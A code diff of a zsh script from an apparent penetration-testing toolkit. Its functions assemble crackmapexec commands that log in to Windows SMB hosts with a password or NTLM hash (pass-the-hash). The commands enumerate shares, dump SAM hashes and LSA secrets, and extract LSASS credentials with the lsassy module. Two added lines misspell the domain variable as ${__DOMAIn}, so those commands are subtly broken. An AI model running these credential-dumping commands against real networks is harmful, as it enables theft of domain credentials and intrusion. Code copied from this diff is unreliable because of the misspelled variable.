@@ -29,12 +29,8 @@ nb-ad-pth-install() {
 
 nb-ad-pth-pass() {
     __check-project
-    nb-vars-set-network
-    echo
-    __ask "Enter target AD domain (must also be set in your hosts file)"
-    nb-vars-set-domain
-    echo
-    __ask "Enter a user account"
+    __check-network
+    __check-domain
     __check-user
     echo
 
@@ -59,9 +55,8 @@ nb-ad-pth-pass() {
 
 nb-ad-pth-enum() {
     __check-project
-    nb-vars-set-network
-    echo
-    __ask "Enter a user account/user list"
+    __check-network
+    __check-domain
 	  __check-user
     echo
 
@@ -72,7 +67,7 @@ nb-ad-pth-enum() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --shares | tee -a $(__netadpath)/cme-SHARES-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} --shares | tee -a $(__netadpath)/cme-SHARES-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
@@ -86,9 +81,8 @@ nb-ad-pth-enum() {
 
 nb-ad-pth-sam() {
     __check-project
-    nb-vars-set-network
-    echo
-    __ask "Enter a user account/user list"
+    __check-network
+    __check-domain
 	  __check-user
     echo
 
@@ -99,7 +93,7 @@ nb-ad-pth-sam() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --sam | tee -a $(__netadpath)/cme-SAM-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIn} -p ${__PASS} --sam | tee -a $(__netadpath)/cme-SAM-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
@@ -113,9 +107,8 @@ nb-ad-pth-sam() {
 
 nb-ad-pth-lsa() {
     __check-project
-    nb-vars-set-network
-    echo
-    __ask "Enter a user account"
+    __check-network
+    __check-domain
 	  __check-user
     echo
 
@@ -126,7 +119,7 @@ nb-ad-pth-lsa() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} --lsa | tee -a $(__netadpath)/cme-LSA-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS} --lsa | tee -a $(__netadpath)/cme-LSA-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
@@ -140,9 +133,8 @@ nb-ad-pth-lsa() {
 
 nb-ad-pth-lsassy() {
     __check-project
-    nb-vars-set-network
-    echo
-    __ask "Enter a user account"
+    __check-network
+    __check-domain
 	  __check-user
     echo
 
@@ -153,7 +145,7 @@ nb-ad-pth-lsassy() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p ${__PASS} -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIn} -p ${__PASS} -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
